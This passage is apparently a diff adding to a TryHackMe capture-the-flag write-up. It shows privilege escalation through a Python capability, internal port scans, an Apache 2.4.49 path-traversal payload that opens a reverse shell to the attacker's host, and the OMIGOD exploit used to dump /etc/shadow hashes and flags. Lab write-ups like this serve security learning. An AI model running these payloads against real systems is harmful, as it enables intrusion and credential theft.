@@ -199,3 +199,204 @@ find / -perm -4000 2>/dev/null | xargs ls -lah
 -rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
 -rwsr-xr-x 1 root root        46K Sep 28  2021 /usr/local/apache2/bin/suexec
 
+daemon@4a70924bafa0:/$ getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null
+/usr/bin/python3.7 = cap_setuid+ep
+daemon@4a70924bafa0:/$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+< -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+```text
+# whoami
+whoami
+root
+```
+```text
+# cd /root
+cd /root
+```
+```text
+# ls
+ls
+user.txt
+```
+```text
+# cat user.txt
+cat user.txt
+THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
+
+root@4a70924bafa0:/root# ifconfig
+ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+        RX packets 85464  bytes 13192306 (12.5 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 79081  bytes 28186090 (26.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@4a70924bafa0:/root# ping 172.17.0.1
+ping 172.17.0.1
+bash: ping: command not found
+root@4a70924bafa0:/root# curl http://172.17.0.1
+curl http://172.17.0.2
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    
+    <!--====== Title ======-->
+    <title>Consult - Business Consultancy Agency Template | Home</title>
+
+root@4a70924bafa0:/bin# for ip in 1 2; do echo "172.17.0.$ip:"; for i in {1..15000}; do echo 2>/dev/null > /dev/tcp/172.17.0.$ip/$i && echo "$i open"; done; echo " ";done;
+<17.0.$ip/$i && echo "$i open"; done; echo " ";done;
+172.17.0.1:
+...
+
+using curl
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat curl.sh 
+#!/bin/bash
+
+for port in {1..65535}; do
+    if curl --connect-timeout 2 -s -I 172.17.0.1:$port >/dev/null; then
+        echo "Port $port is open"
+    else
+        echo "Port $port is closed or unknown"
+    fi
+done
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.214.74 - - [27/Feb/2023 12:53:56] "GET /curl.sh HTTP/1.1" 200 -
+root@4a70924bafa0:/bin# curl -o curl.sh http://10.8.19.103:1234/curl.sh
+curl -o curl.sh http://10.8.19.103:1234/curl.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   143  100   143    0     0    290      0 --:--:-- --:--:-- --:--:--   290
+
+maybe getting a nmap binary
+
+https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 7070                            
+Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
+10.10.135.128 - - [27/Feb/2023 13:02:39] "GET /curl.sh HTTP/1.1" 200 -
+10.10.135.128 - - [27/Feb/2023 13:05:58] "GET /nmap HTTP/1.1" 200 -
+
+root@4a70924bafa0:/tmp# curl -o nmap http://10.8.19.103:7070/nmap
+curl -o nmap http://10.8.19.103:7070/nmap
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 5805k  100 5805k    0     0  1332k      0  0:00:04  0:00:04 --:--:-- 1332k
+
+root@4a70924bafa0:/tmp# chmod +x nmap
+chmod +x nmap
+
+root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate 5000
+./nmap 172.17.0.1 -p- --min-rate 5000
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-02-27 18:16 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000030s latency).
+Not shown: 65531 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+5985/tcp closed unknown
+5986/tcp open   unknown
+MAC Address: 02:42:B2:08:1C:C6 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 39.76 seconds
+
+https://github.com/AlteredSecurity/CVE-2021-38647
+
+https://github.com/horizon3ai/CVE-2021-38647
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/horizon3ai/CVE-2021-38647.git
+Cloning into 'CVE-2021-38647'...
+remote: Enumerating objects: 14, done.
+remote: Counting objects: 100% (14/14), done.
+remote: Compressing objects: 100% (10/10), done.
+remote: Total 14 (delta 2), reused 9 (delta 2), pack-reused 0
+Receiving objects: 100% (14/14), 9.86 KiB | 373.00 KiB/s, done.
+Resolving deltas: 100% (2/2), done.
+
+doing again
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl -v 'http://10.10.135.128//cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; sh -i >& /dev/tcp/10.8.19.103/1337 0>&1' -H "Content-Type: text/plain"
+*   Trying 10.10.135.128:80...
+* Connected to 10.10.135.128 (10.10.135.128) port 80 (#0)
+> POST //cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
+> Host: 10.10.135.128
+> User-Agent: curl/7.87.0
+> Accept: */*
+> Content-Type: text/plain
+> Content-Length: 76
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Mon, 27 Feb 2023 18:21:46 GMT
+< Server: Apache/2.4.49 (Unix)
+< Transfer-Encoding: chunked
+< Content-Type: text/plain
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-38647]
+└─$ ls
+omigod.py  proof.png  README.md
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.135.128] 34990
+sh: 0: can't access tty; job control turned off
+```
+```text
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+daemon@4a70924bafa0:/bin$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+< -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+```text
+# bash
+bash
+root@4a70924bafa0:/bin# cd /tmp
+cd /tmp
+root@4a70924bafa0:/tmp# ls
+ls
+nmap
+curl -o omigod.py http://10.8.19.103:7070/omigod.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2720  100  2720    0     0   6296      0 --:--:-- --:--:-- --:--:--  6296
+
+root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -c "whoami;id;cat /etc/shadow;cat /root/root.txt"
+<1 -c "whoami;id;cat /etc/shadow;cat /root/root.txt"
+root&#10;uid=0(root) gid=0(root) groups=0(root)&#10;root:$6$x7/DJQUNJgF2HsCq$F.KakHRIWPl4.mbeeY3L6Bx2Mdg6VCiBIwVALTG.bg/vG6vo7FoIbr9NLmoNTqaY9Lla/AOue/jkhENQ2wvO5/:18908:0:99999:7:::&#10;daemon:*:18659:0:99999:7:::&#10;bin:*:18659:0:99999:7:::&#10;sys:*:18659:0:99999:7:::&#10;sync:*:18659:0:99999:7:::&#10;games:*:18659:0:99999:7:::&#10;man:*:18659:0:99999:7:::&#10;lp:*:18659:0:99999:7:::&#10;mail:*:18659:0:99999:7:::&#10;news:*:18659:0:99999:7:::&#10;uucp:*:18659:0:99999:7:::&#10;proxy:*:18659:0:99999:7:::&#10;www-data:*:18659:0:99999:7:::&#10;backup:*:18659:0:99999:7:::&#10;list:*:18659:0:99999:7:::&#10;irc:*:18659:0:99999:7:::&#10;gnats:*:18659:0:99999:7:::&#10;nobody:*:18659:0:99999:7:::&#10;systemd-network:*:18659:0:99999:7:::&#10;systemd-resolve:*:18659:0:99999:7:::&#10;systemd-timesync:*:18659:0:99999:7:::&#10;messagebus:*:18659:0:99999:7:::&#10;syslog:*:18659:0:99999:7:::&#10;_apt:*:18659:0:99999:7:::&#10;tss:*:18659:0:99999:7:::&#10;uuidd:*:18659:0:99999:7:::&#10;tcpdump:*:18659:0:99999:7:::&#10;landscape:*:18659:0:99999:7:::&#10;pollinate:*:18659:0:99999:7:::&#10;usbmux:*:18900:0:99999:7:::&#10;sshd:*:18900:0:99999:7:::&#10;systemd-coredump:!!:18900::::::&#10;ubuntu:$6$87IYj.DXrYWsA9Yq$ZTim1Zo/UhfEFnbjz6mj9MvyyHR48dWdk1iL5yJ9o1.WO84AStOBM.ahug0L0ICR.1FgvgWN4TV4vtSosuKeD1:18908:0:99999:7:::&#10;lxd:!:18900::::::&#10;omi:!:18900::::::&#10;dnsmasq:*:18908:0:99999:7:::&#10;
+THM{7f147ef1f36da9ae29529890a1b6011f}
+```
+What is the user flag?
+What is the root flag?
+
+## Flags / Answers
+- ***THM{eacffefe1d2aafcc15e70dc2f07f7ac1}***
+- ***THM{7f147ef1f36da9ae29529890a1b6011f}***
+
+## Notes / Lessons Learned
+[[Road]]
+
